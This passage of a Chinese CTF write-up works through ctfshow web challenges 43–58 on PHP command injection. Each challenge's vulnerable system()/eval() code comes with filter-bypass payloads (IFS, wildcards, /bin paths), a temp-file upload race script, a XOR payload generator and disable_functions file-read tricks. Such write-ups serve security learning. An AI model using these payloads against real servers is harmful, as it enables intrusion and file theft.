<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%<span class="number">26</span>		<span class="comment">#flag.php index.php 	?c=tac flag.php%26</span></span><br></pre></td></tr></table></figure>

<h2 id="1-16-Web-44-—-过滤-flag-—-绕过"><a href="#1-16-Web-44-—-过滤-flag-—-绕过" class="headerlink" title="1.16 Web 44 — 过滤 flag — * 绕过"></a>1.16 Web 44 — 过滤 flag — * 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls%<span class="number">0</span>a?c=tac f*%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<h2 id="1-17-Web-45-—-过滤-空格-—-IFS-绕过"><a href="#1-17-Web-45-—-过滤-空格-—-IFS-绕过" class="headerlink" title="1.17 Web 45 — 过滤 空格 — ||  ${IFS} 绕过"></a>1.17 Web 45 — 过滤 空格 — ||  ${IFS} 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f*||?c=tac<span class="variable">$&#123;IFS&#125;</span>f*||?c=tac$IFS<span class="variable">$1f</span>*||</span><br></pre></td></tr></table></figure>

<h2 id="1-18-Web-46-—-过滤-—-绕过"><a href="#1-18-Web-46-—-过滤-—-绕过" class="headerlink" title="1.18 Web 46 — 过滤 * — ? 绕过"></a>1.18 Web 46 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09fl?g.php||</span><br></pre></td></tr></table></figure>

<h2 id="1-19-Web-47-—-过滤-—-绕过"><a href="#1-19-Web-47-—-过滤-—-绕过" class="headerlink" title="1.19 Web 47 — 过滤 * — ? 绕过"></a>1.19 Web 47 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f?ag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-20-Web-48-—-过滤-—-绕过"><a href="#1-20-Web-48-—-过滤-—-绕过" class="headerlink" title="1.20 Web 48 — 过滤 * — ? 绕过"></a>1.20 Web 48 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f?ag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-21-Web-49-—-过滤-—-绕过"><a href="#1-21-Web-49-—-过滤-—-绕过" class="headerlink" title="1.21 Web 49 — 过滤 * — ? 绕过"></a>1.21 Web 49 — 过滤 * — ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=tac%09f?ag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-22-Web-50-—-过滤-通配符-—-gt-lt-绕过"><a href="#1-22-Web-50-—-过滤-通配符-—-gt-lt-绕过" class="headerlink" title="1.22 Web 50 — 过滤 通配符 — \ &gt; &lt; 绕过"></a>1.22 Web 50 — 过滤 通配符 — \ &gt; &lt; 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=nl&lt;fl\ag.php||?c=nl&gt;fl\ag.php||?c=nl&lt;&gt;fl\ag.php||?c=vi&lt;fl\ag.php||<span class="comment">#该题使用通配符不可行</span></span><br></pre></td></tr></table></figure>

<h2 id="1-23-Web-51-—-过滤-空格、通配符、-—-gt-lt-绕过"><a href="#1-23-Web-51-—-过滤-空格、通配符、-—-gt-lt-绕过" class="headerlink" title="1.23 Web 51 — 过滤 空格、通配符、$ — \ &gt; &lt; 绕过"></a>1.23 Web 51 — 过滤 空格、通配符、$ — \ &gt; &lt; 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls||?c=nl&lt;fl\ag.php||</span><br></pre></td></tr></table></figure>

<h2 id="1-24-Web-52-—-过滤-空格、通配符、-gt-lt-—-绕过"><a href="#1-24-Web-52-—-过滤-空格、通配符、-gt-lt-—-绕过" class="headerlink" title="1.24 Web 52 — 过滤 空格、通配符、&gt; &lt; — \  $ 绕过"></a>1.24 Web 52 — 过滤 空格、通配符、&gt; &lt; — \  $ 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#禁止了&lt; &gt;,又释放了 $?c=ls||						#flag.php index.php ?c=nl$&#123;IFS&#125;fl\ag.php||		#flag_here，错误的flag?c=ls$&#123;IFS&#125;/||				#bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var ?c=nl$&#123;IFS&#125;/fl\ag||</span></span><br></pre></td></tr></table></figure>

<h2 id="1-25-Web-53-—-system-—-nl-IFS-绕过"><a href="#1-25-Web-53-—-system-—-nl-IFS-绕过" class="headerlink" title="1.25 Web 53 — system() — nl \ ${IFS} 绕过"></a>1.25 Web 53 — system() — nl \ ${IFS} 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;        <span class="keyword">echo</span>(<span class="variable">$c</span>);        <span class="variable">$d</span> = system(<span class="variable">$c</span>);        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls	<span class="comment">#lsflag.php index.php readflag readflag?c=nl$&#123;IFS&#125;fla\g.php</span></span><br></pre></td></tr></table></figure>

<h2 id="1-26-Web-54-—-system-—-vi-IFS-绕过"><a href="#1-26-Web-54-—-system-—-vi-IFS-绕过" class="headerlink" title="1.26 Web 54 — system() — vi ${IFS} ? 绕过"></a>1.26 Web 54 — system() — vi ${IFS} ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="variable">$c</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls 		<span class="comment">#flag.php index.php ?c=vi$&#123;IFS&#125;f???.????c=vi$&#123;IFS&#125;????.???</span></span><br></pre></td></tr></table></figure>

<h2 id="1-27-Web-55-—-过滤-字母-a-z-—-bin-绕过"><a href="#1-27-Web-55-—-过滤-字母-a-z-—-bin-绕过" class="headerlink" title="1.27 Web 55 — 过滤 字母 [a-z] — /bin/ + ? 绕过"></a>1.27 Web 55 — 过滤 字母 [a-z] — /bin/ + ? 绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="comment">// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125; </span></span><br></pre></td></tr></table></figure>

<p><strong>bin</strong> 为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是 <code>/bin/ls</code><br><strong>测试：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch flag.phpecho 123 &gt; flag.phpbase64 flag.php/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/30/xgpZKh3ToGdwrN1.png" alt="image-20210730181951457"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 /bin/目录?c=/???/????64 ????.???# ?c=/bin/base64 flag.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 /usr/bin/目录# 我们可以利用/usr/bin下的**bzip2**,即也就是/usr/bin/bzip2 flag.php# 意思就是说我们先将flag.php文件进行压缩，然后再将其下载?c=/???/???/????2 ????.???# ?c=/usr/bin/bzip2 flag.php# 把flag.php压缩，访问 url + flag.php.bz2 就可以把压缩后的flag.php给下载下来</span></span><br></pre></td></tr></table></figure>

<h2 id="1-28-Web-56-—-过滤-a-z-0-9-—-POST-包绕过（利用-）"><a href="#1-28-Web-56-—-过滤-a-z-0-9-—-POST-包绕过（利用-）" class="headerlink" title="1.28 Web 56 — 过滤 [a-z] [0-9] — POST 包绕过（利用 . ?）"></a>1.28 Web 56 — 过滤 [a-z] [0-9] — POST 包绕过（利用 . ?）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;        system($c);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>POST 上传包</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。将命令写入文件后，可以利用点. 来执行文件中的命令，例如. file。也可以<span class="built_in">source</span> file，但是这题过滤了字母，因此只能用点。如何正确匹配到我们上传的文件呢？探索过程见p神的文章，最后的利用是/???/????????[@-[]</span><br></pre></td></tr></table></figure>

<p>文件上传的前端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form  method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;1&quot;</span>&gt;    &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;2&quot;</span>&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;<span class="comment"># 抓包 修改文件内容为 命令</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p><strong>Python 脚本</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requestsurl = <span class="string">&#x27;http://57601c3a-595e-4ea4-a88c-61daa047e7b0.challenge.ctf.show:8080/&#x27;</span>url += <span class="string">&#x27;?c=. /???/????????[@-[]&#x27;</span><span class="comment">#构造urlwhile True:    r = requests.post(url,files=&#123;&#x27;file&#x27;:(&quot;dota.txt&quot;,&quot;cat flag.php&quot;)&#125;)#以post进行发包    flag = r.text.split(&quot;ctfshow&quot;)#split() 通过指定分隔符对字符串进行切片，如果参数 num 有指定值，则分隔 num+1 个子字符串    if len(flag)&gt;1:#说明flag获得值了！        print(r.text)#打印flag        break#跳出循环</span></span><br></pre></td></tr></table></figure>

<h2 id="1-29-Web-57-—-过滤-a-z-0-9-—-异或"><a href="#1-29-Web-57-—-过滤-a-z-0-9-—-异或" class="headerlink" title="1.29 Web 57 — 过滤 [a-z] [0-9] . ? — 异或 $(())"></a>1.29 Web 57 — 过滤 [a-z] [0-9] . ? — 异或 $(())</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 还能炫的动吗？//flag <span class="keyword">in</span> 36.phpif(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;        system(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);    &#125;&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># . ? 均被过滤</span></span><br></pre></td></tr></table></figure>

<p><strong>无字母、数字终极绕过 — 异或</strong></p>
<p>双小括号 (( )) 是 Bash Shell 中专门用来进行 <strong>整数运算</strong> 的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。<br>通俗地讲，就是将数学运算表达式放在((和))之间。</p>
<p>表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</p>
<p>可以 <strong>使用$获取 (( )) 命令的结果</strong>，这和使用$获得变量值是类似的。</p>
<p>可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</p>
<p>注意，类似 c=((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/脚本<span class="comment"># echo $(())0root@kali:~/桌面/脚本# echo $((~$(())))-1root@kali:~/桌面/脚本# echo $((     $((~$(())))       $((~$(())))        ))-2root@kali:~/桌面/脚本# echo $((     $((~$(())))   +    $((~$(())))        ))-2# 想办法构造 36# 关于取反，经验就是如果b=~a，那么a+b=-1# payload?c=$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 异或脚本 $(())# -*- coding: utf-8 -*-import redef write():    #preg = &#x27;[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;]+&#x27;    preg = &quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;    str = &quot;&quot;    for i in range(1, 256):        for j in range(1, 256):            if not (re.search(preg, chr(i), re.I) or re.search(preg, chr(j), re.I)):                k = i ^ j                if k &gt;= 32 and k &lt;= 126:                    a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                    b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                    str = (str + chr(k) + &quot; &quot; + a + &quot; &quot; + b + &quot;\n&quot;)    fp = open(&#x27;result.txt&#x27;, &#x27;w&#x27;)    fp.write(str)def produce(string):    str1 = &quot;&quot;    str2 = &quot;&quot;    for i in string:        fp = open(&#x27;result.txt&#x27;, &#x27;r&#x27;)        while True:            line = fp.readline()            if line == &quot;&quot;:                break            if line[0] == i:                str1 = str1 + line[2:5]                str2 = str2 + line[6:9]                break        fp.close()    result = &quot;(\&quot;&quot; + str1 + &quot;\&quot;^\&quot;&quot; + str2 + &quot;\&quot;)&quot;    return resultif __name__ == &quot;__main__&quot;:    write()    while True:        function = input(&quot;输出执行函数:&quot;)        parms = input(&quot;请输出函数参数:&quot;)        payload = produce(function) + produce(parms)        print(payload)</span></span><br></pre></td></tr></table></figure>

<h2 id="1-30-Web-58-—-disable-functions"><a href="#1-30-Web-58-—-disable-functions" class="headerlink" title="1.30 Web 58 — disable_functions"></a>1.30 Web 58 — disable_functions</h2><blockquote>
<p><strong>open_basedir</strong>：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p>
<p><strong>disable_functions</strong>：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</p>
</blockquote>
<p>命令执行，突破禁用函数</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php// 你们在炫技吗？<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];        <span class="built_in">eval</span>(<span class="variable">$c</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用最常见的 c=system(&#x27;ls&#x27;);# 得到Warning: system() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1# 函数被禁用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先尝试不使用 命令执行的函数  # 套娃 函数套用c=print_r(scandir(current(localeconv())));c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));# Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )c=highlight_file(next(array_reverse(scandir(current(localeconv())))));c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;);</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绕disable_functions# 利用 读文件 的函数file_get_contents()highlight_file()show_source()fgets()file()var_dump()readfile()# 利用c=echo file_get_contents(&#x27;flag.php&#x27;);c=highlight_file(&#x27;flag.php&#x27;);c=show_source(&#x27;flag.php&#x27;);c=readfile(&#x27;flag.php&#x27;);c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while($b=fgets($a))&#123;echo $b;&#125;c=$handle=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125;c=$handle=fopen(&#x27;flag.php&#x27;,&#x27;r&#x27;);echo fread($handle,1000);</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复制 重命名copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);            rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 即c=copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);# 后访问 URL/flag.txt 即可</span></span><br></pre></td></tr></table></figure>

